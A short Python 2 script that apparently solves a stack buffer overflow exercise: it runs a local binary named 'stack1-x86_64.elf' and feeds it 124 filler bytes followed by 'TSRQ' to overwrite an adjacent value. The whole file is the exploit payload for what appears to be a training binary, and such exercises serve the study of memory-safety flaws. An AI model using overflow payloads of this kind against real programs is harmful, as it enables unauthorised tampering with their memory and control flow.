import os

StdIn,StdOut = os.popen4(r"./stack1-x86_64.elf")

XploitString = "x" * 124 + "TSRQ" + '\n'
print XploitString

StdIn.write(XploitString)
StdIn.close()

print StdOut.read()